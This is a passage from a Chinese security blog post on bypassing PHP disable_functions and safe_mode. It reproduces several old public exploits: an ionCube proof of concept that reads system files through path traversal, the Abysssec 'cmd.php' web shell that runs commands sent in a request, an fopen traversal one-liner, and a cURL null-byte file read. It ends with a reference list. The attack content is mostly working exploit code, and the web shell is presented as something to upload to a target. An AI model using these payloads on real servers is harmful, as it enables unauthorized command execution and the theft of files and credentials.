<h3 id="PHP-5-2-4-ionCube-extension"><a href="#PHP-5-2-4-ionCube-extension" class="headerlink" title="PHP 5.2.4 ionCube extension"></a>PHP 5.2.4 ionCube extension</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 5.2.4 ionCube extension safe_mode and disable_functions protections bypass</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//author: shinnai</span></span><br><span class="line"><span class="comment">//mail: shinnai[at]autistici[dot]org</span></span><br><span class="line"><span class="comment">//site: http://shinnai.altervista.org</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//Tested on xp Pro sp2 full patched, worked both from the cli and on apache</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//Technical details:</span></span><br><span class="line"><span class="comment">//ionCube version: 6.5</span></span><br><span class="line"><span class="comment">//extension: ioncube_loader_win_5.2.dll (other may also be vulnerable)</span></span><br><span class="line"><span class="comment">//url: www.ioncube.com</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//php.ini settings:</span></span><br><span class="line"><span class="comment">//safe_mode = On</span></span><br><span class="line"><span class="comment">//disable_functions = ioncube_read_file, readfile</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//Description:</span></span><br><span class="line"><span class="comment">//This is useful to obtain juicy informations but also to retrieve source</span></span><br><span class="line"><span class="comment">//code of php pages, password files, etc... you just need to change file path.</span></span><br><span class="line"><span class="comment">//Anyway, don&#x27;t worry, nobody will read your obfuscated code :)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//greetz to: BlackLight for help me to understand better PHP</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//P.S.</span></span><br><span class="line"><span class="comment">//This extension contains even an interesting ioncube_write_file function...</span></span><br><span class="line"><span class="keyword">if</span> (!extension_loaded(<span class="string">&quot;ionCube Loader&quot;</span>)) <span class="keyword">die</span>(<span class="string">&quot;ionCube Loader extension required!&quot;</span>);</span><br><span class="line"><span class="variable">$path</span> = str_repeat(<span class="string">&quot;..\\&quot;</span>, <span class="number">20</span>);</span><br><span class="line"><span class="variable">$MyBoot_readfile</span> = readfile(<span class="variable">$path</span>.<span class="string">&quot;windows\\system.ini&quot;</span>); <span class="comment">#just to be sure that I set correctely disable_function :)</span></span><br><span class="line"><span class="variable">$MyBoot_ioncube</span> = ioncube_read_file(<span class="variable">$path</span>.<span class="string">&quot;boot.ini&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$MyBoot_readfile</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;ionCube output:&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$MyBoot_ioncube</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-lt-5-2-9-Windows-x86-Safe-mode-Bypass-Vulnerability"><a href="#PHP-lt-5-2-9-Windows-x86-Safe-mode-Bypass-Vulnerability" class="headerlink" title="PHP &lt;=5.2.9 (Windows x86) Safe_mode Bypass Vulnerability"></a>PHP &lt;=5.2.9 (Windows x86) Safe_mode Bypass Vulnerability</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//cmd.php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Abysssec Inc Public Advisory </span></span><br><span class="line"><span class="comment">	</span></span><br><span class="line"><span class="comment">	Here is another safemod bypass vulnerability exist in php &lt;= 5.2.9 on windows .</span></span><br><span class="line"><span class="comment">	the problem comes from OS behavior - implement  and interfacing between php</span></span><br><span class="line"><span class="comment">	and operation systems directory structure . the problem is php won&#x27;t tell difference </span></span><br><span class="line"><span class="comment">	between directory browsing in linux and windows this can lead attacker to ability </span></span><br><span class="line"><span class="comment">	execute his / her commands on targert machie even in SafeMod On  (php.ini setting) . </span></span><br><span class="line"><span class="comment">	=============================================================================</span></span><br><span class="line"><span class="comment">	in linux when you want open a directory for example php directory you need</span></span><br><span class="line"><span class="comment">	to go to /usr/bin/php and you can&#x27;t use \usr\bin\php . but windows won&#x27;t tell</span></span><br><span class="line"><span class="comment">	diffence between slash and back slash it means there is no didffrence  between </span></span><br><span class="line"><span class="comment">	c:\php and c:/php , and this is not vulnerability but itself but  because of this  simple </span></span><br><span class="line"><span class="comment">	php implement &quot;\&quot; character can escape safemode using  function like excec . </span></span><br><span class="line"><span class="comment">	here is a PoC for discussed vulnerability . just upload files on your target host and execute</span></span><br><span class="line"><span class="comment">	your commands . </span></span><br><span class="line"><span class="comment">	==============================================================================</span></span><br><span class="line"><span class="comment">	note : this vulnerabities is just for educational purpose and author will be not be responsible  </span></span><br><span class="line"><span class="comment">	for any damage using this vulnerabilty. </span></span><br><span class="line"><span class="comment">	==============================================================================</span></span><br><span class="line"><span class="comment">	for more information visit Abysssec.com</span></span><br><span class="line"><span class="comment">	feel free to contact me at admin [at] abysssec.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">	<span class="variable">$cmd</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$cmd</span>)&#123;</span><br><span class="line">	<span class="variable">$batch</span> = fopen (<span class="string">&quot;cmd.bat&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">	fwrite(<span class="variable">$batch</span>,<span class="string">&quot;<span class="subst">$cmd</span>&gt;abysssec.txt&quot;</span>.<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">	fwrite(<span class="variable">$batch</span>,<span class="string">&quot;exit&quot;</span>);</span><br><span class="line">	fclose(<span class="variable">$batch</span>);</span><br><span class="line">	exec(<span class="string">&quot;\start cmd.bat&quot;</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Abysssec.com PHP &lt;= 5.2.9 SafeMod Bypasser&lt;/h1&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;textarea rows=20 cols=60&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">&quot;abysssec.txt&quot;</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/textarea&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body bgcolor=<span class="comment">#000000 and text=#DO0000&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;form method=post&gt;</span><br><span class="line">&lt;input type=text name=cmd &gt;</span><br><span class="line">&lt;input type=submit value=bypass&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="PHP-5-2-FOpen-Safe-mode-Restriction-Bypass-Vulnerability"><a href="#PHP-5-2-FOpen-Safe-mode-Restriction-Bypass-Vulnerability" class="headerlink" title="PHP 5.2 FOpen Safe_mode Restriction Bypass Vulnerability"></a>PHP 5.2 FOpen Safe_mode Restriction Bypass Vulnerability</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">source: https://www.securityfocus.com/bid/22261/info</span><br><span class="line"></span><br><span class="line">PHP is prone to a &#x27;safe_mode&#x27; restriction-bypass vulnerability. Successful exploits could allow an attacker to write files in unauthorized locations; other attacks may also be possible.</span><br><span class="line"></span><br><span class="line">This vulnerability would be an issue in shared-hosting configurations where multiple users can create and execute arbitrary PHP script code, all assuming that the &#x27;safe_mode&#x27; restriction will isolate users from each other.</span><br><span class="line"></span><br><span class="line">This issue is reported to affect PHP version 5.2.0; other versions may also be vulnerable. </span><br><span class="line"></span><br><span class="line">php -r &#x27;fopen(&quot;srpath://../../../../../../../dir/pliczek&quot;, &quot;a&quot;);&#x27; </span><br></pre></td></tr></table></figure>
<h3 id="PHP-5-2-4-and-5-2-5-PHP-cURL-Safe-mode-Bypass-Vulnerability"><a href="#PHP-5-2-4-and-5-2-5-PHP-cURL-Safe-mode-Bypass-Vulnerability" class="headerlink" title="PHP 5.2.4 and 5.2.5 PHP cURL Safe_mode Bypass Vulnerability"></a>PHP 5.2.4 and 5.2.5 PHP cURL Safe_mode Bypass Vulnerability</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">source: http://www.securityfocus.com/bid/27413/info</span><br><span class="line"> </span><br><span class="line">PHP cURL is prone to a &#x27;safe mode&#x27; security-bypass vulnerability.</span><br><span class="line"> </span><br><span class="line">Attackers can use this issue to gain access to restricted files, potentially obtaining sensitive information that may aid in further attacks.</span><br><span class="line"> </span><br><span class="line">The issue affects PHP 5.2.5 and 5.2.4. </span><br><span class="line"> </span><br><span class="line">var_dump(curl_exec(curl_init(&quot;file://safe_mode_bypass\x00&amp;quot;.__FILE__)));</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8669#toc-5">ByteCTF WP-无需mail bypass disable_functions - 先知社区 (aliyun.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/hxhxhxhxx/article/details/107996904">RCE命令执行/代码执行_hxhxhxhxx的博客-CSDN博客_rce执行</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ahtoh/p/14873889.html">php漏洞复现 - Антон - 博客园 (cnblogs.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.xlab.app/p/a63cefbc/">蚁剑 disable_functions 研究 | 明天的乌云 (xlab.app)</a></li>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">CVE-2016-3714 - ImageMagick 命令执行分析 | 离别歌 (leavesongs.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/mirror97black/article/details/78854400">ImageMagick 命令执行漏洞_mirror97black的博客-CSDN博客_imagemagick漏洞</a></li>
<li><a target="_blank" rel="noopener" href="http://blog.o3ev.cn/index.php/archives/556/">ImageMagick 命令执行【CVE-2016-3714】 - o3Ev’s blog</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42303523/article/details/117911859">使用GCONV<em>PATH与iconv进行bypass disable<em>functions_lesion</em></em>的博客-CSDN博客</a></li>
<li><a target="_blank" rel="noopener" href="https://www.erikten.cn/posts/bbe4cfcb.html">从代码层分析蚁剑“绕过disable_function”插件功能（中） | Erikten</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/one-seven/p/15194350.html">Disable_functions绕过整合 - one-seven - 博客园 (cnblogs.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits">mm0r1/exploits: Pwn stuff. (github.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/192712.html">CVE-2018-19518：PHP imap_open函数任意命令执行漏洞复现 - FreeBuf网络安全行业门户</a></li>
<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1063/">PHP-fpm 远程代码执行漏洞(CVE-2019-11043)分析 (seebug.org)</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/251017.html">PHP SplDoublyLinkedList中的用后释放漏洞分析 - FreeBuf网络安全行业门户</a></li>
<li><a target="_blank" rel="noopener" href="http://blog.safebuff.com/2016/05/06/disable-functions-bypass/">disable_functions bypass | xl7dev (safebuff.com)</a></li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ulysses</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://plumeria.ltd/post/9916b941.html">https://plumeria.ltd/post/9916b941.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://plumeria.ltd" target="_blank">Ulysses'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/bypass-disable-functions/">bypass disable_functions</a></div><div class="post_share"><div class="social-share" data-image="/img/cover/disable_functions.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/916cb2da.html"><img class="prev-cover" src="/img/gif/loading4.gif" data-original="/img/cover/upload1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">文件上传漏洞之代码检测绕过</div></div></a></div><div class="next-post pull-right"><a href="/post/ee1189d7.html"><img class="next-cover" src="/img/gif/loading4.gif" data-original="/img/cover/disable_functions.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">突破disable_functions执行命令·上</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/ee1189d7.html" title="突破disable_functions执行命令·上"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/disable_functions.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-10</div><div class="title">突破disable_functions执行命令·上</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/gif/loading4.gif" data-original="https://avatars.githubusercontent.com/u/63300491?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ulysses</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/UlyssesTakusen"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">记录学习与生活~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8UAF%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">利用UAF漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Json-Serializer-UAF"><span class="toc-number">1.1.</span> <span class="toc-text">Json Serializer UAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP7-GC-with-Certain-Destructors-UAF"><span class="toc-number">1.2.</span> <span class="toc-text">PHP7 GC  with Certain Destructors UAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP7-Backtrace-UAF"><span class="toc-number">1.3.</span> <span class="toc-text">PHP7 Backtrace UAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP7-ReflectionProperty-UAF"><span class="toc-number">1.4.</span> <span class="toc-text">PHP7  ReflectionProperty UAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-concat-function-UAF"><span class="toc-number">1.5.</span> <span class="toc-text">PHP concat_function UAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-user-filter"><span class="toc-number">1.6.</span> <span class="toc-text">PHP user_filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-SplDoublyLinkedList-UAF"><span class="toc-number">1.7.</span> <span class="toc-text">PHP SplDoublyLinkedList UAF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-ShellShock-%E6%BC%8F%E6%B4%9E-CVE-2014-6271"><span class="toc-number">2.</span> <span class="toc-text">利用 ShellShock 漏洞 (CVE-2014-6271)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-ImageMagick-RCE-%E6%BC%8F%E6%B4%9E-CVE-2016-3714"><span class="toc-number">3.</span> <span class="toc-text">利用 ImageMagick RCE 漏洞 (CVE-2016-3714)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-GhostScript-%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87-RCE-%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">利用 GhostScript 沙箱绕过 RCE 漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-PHP-imap-open-RCE-%E6%BC%8F%E6%B4%9E-CVE-2018-19518"><span class="toc-number">5.</span> <span class="toc-text">利用 PHP imap_open RCE 漏洞 (CVE-2018-19518)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Nginx-PHP-fpm-RCE-%E6%BC%8F%E6%B4%9E-CVE-2019-11043"><span class="toc-number">6.</span> <span class="toc-text">利用Nginx+PHP-fpm RCE 漏洞 (CVE-2019-11043)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">7.</span> <span class="toc-text">其它绕过方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP5-pcntl-exec"><span class="toc-number">7.1.</span> <span class="toc-text">PHP5 pcntl_exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-proc-open"><span class="toc-number">7.2.</span> <span class="toc-text">PHP proc_open()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-5-2-3-win32std-Extension"><span class="toc-number">7.3.</span> <span class="toc-text">PHP 5.2.3 win32std Extension</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-Perl-Extension"><span class="toc-number">7.4.</span> <span class="toc-text">PHP Perl Extension</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-5-2-4-ionCube-extension"><span class="toc-number">7.5.</span> <span class="toc-text">PHP 5.2.4 ionCube extension</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-lt-5-2-9-Windows-x86-Safe-mode-Bypass-Vulnerability"><span class="toc-number">7.6.</span> <span class="toc-text">PHP &lt;&#x3D;5.2.9 (Windows x86) Safe_mode Bypass Vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-5-2-FOpen-Safe-mode-Restriction-Bypass-Vulnerability"><span class="toc-number">7.7.</span> <span class="toc-text">PHP 5.2 FOpen Safe_mode Restriction Bypass Vulnerability</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-5-2-4-and-5-2-5-PHP-cURL-Safe-mode-Bypass-Vulnerability"><span class="toc-number">7.8.</span> <span class="toc-text">PHP 5.2.4 and 5.2.5 PHP cURL Safe_mode Bypass Vulnerability</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">8.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/d5e40e85.html" title="文件上传漏洞之WAF拦截绕过"><img src="/img/gif/loading4.gif" data-original="/img/cover/upload2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件上传漏洞之WAF拦截绕过"/></a><div class="content"><a class="title" href="/post/d5e40e85.html" title="文件上传漏洞之WAF拦截绕过">文件上传漏洞之WAF拦截绕过</a><time datetime="2022-01-22T06:00:00.000Z" title="发表于 2022-01-22 14:00:00">2022-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/916cb2da.html" title="文件上传漏洞之代码检测绕过"><img src="/img/gif/loading4.gif" data-original="/img/cover/upload1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件上传漏洞之代码检测绕过"/></a><div class="content"><a class="title" href="/post/916cb2da.html" title="文件上传漏洞之代码检测绕过">文件上传漏洞之代码检测绕过</a><time datetime="2022-01-20T12:00:00.000Z" title="发表于 2022-01-20 20:00:00">2022-01-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/9916b941.html" title="突破disable_functions执行命令·下"><img src="/img/gif/loading4.gif" data-original="/img/cover/disable_functions.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="突破disable_functions执行命令·下"/></a><div class="content"><a class="title" href="/post/9916b941.html" title="突破disable_functions执行命令·下">突破disable_functions执行命令·下</a><time datetime="2022-01-12T12:00:00.000Z" title="发表于 2022-01-12 20:00:00">2022-01-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/ee1189d7.html" title="突破disable_functions执行命令·上"><img src="/img/gif/loading4.gif" data-original="/img/cover/disable_functions.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="突破disable_functions执行命令·上"/></a><div class="content"><a class="title" href="/post/ee1189d7.html" title="突破disable_functions执行命令·上">突破disable_functions执行命令·上</a><time datetime="2022-01-10T12:00:00.000Z" title="发表于 2022-01-10 20:00:00">2022-01-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/763788f5.html" title="突破open_basedir限制读写文件"><img src="/img/gif/loading4.gif" data-original="/img/cover/open_basedir.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="突破open_basedir限制读写文件"/></a><div class="content"><a class="title" href="/post/763788f5.html" title="突破open_basedir限制读写文件">突破open_basedir限制读写文件</a><time datetime="2022-01-03T11:00:00.000Z" title="发表于 2022-01-03 19:00:00">2022-01-03</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Ulysses</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/algolia.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'iuIup4lvgEwLDu3U8Qc3GOXd-gzGzoHsz',
      appKey: 'Ls9mJKS2MmvbfsPbPCeb2cnA',
      placeholder: 'Please leave your footprints',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      master: '5671db8c5f953943b68468c62e317e7e,007d3a0fdf1072ff1db83a005457a3c9,503ee756200f9eba794e5467c89e98f8,048233cc2ce6903ca93ba6e0597462ae'.split(','),
      friends: ''.split(','),
      tagMeta: '博主,小伙伴,访客'.split(','),
      path: window.location.pathname,
      requiredFields: ["nick,mail"],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script src="/js/smooth-scrolling.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
  'title',
  '#config-diff',
  '#body-wrap',
  '#rightside-config-hide',
  '#rightside-config-show',
  '.js-pjax'
]

if (false) {
  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
}

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.removeEventListener('scroll', window.tocScrollFn)
  window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
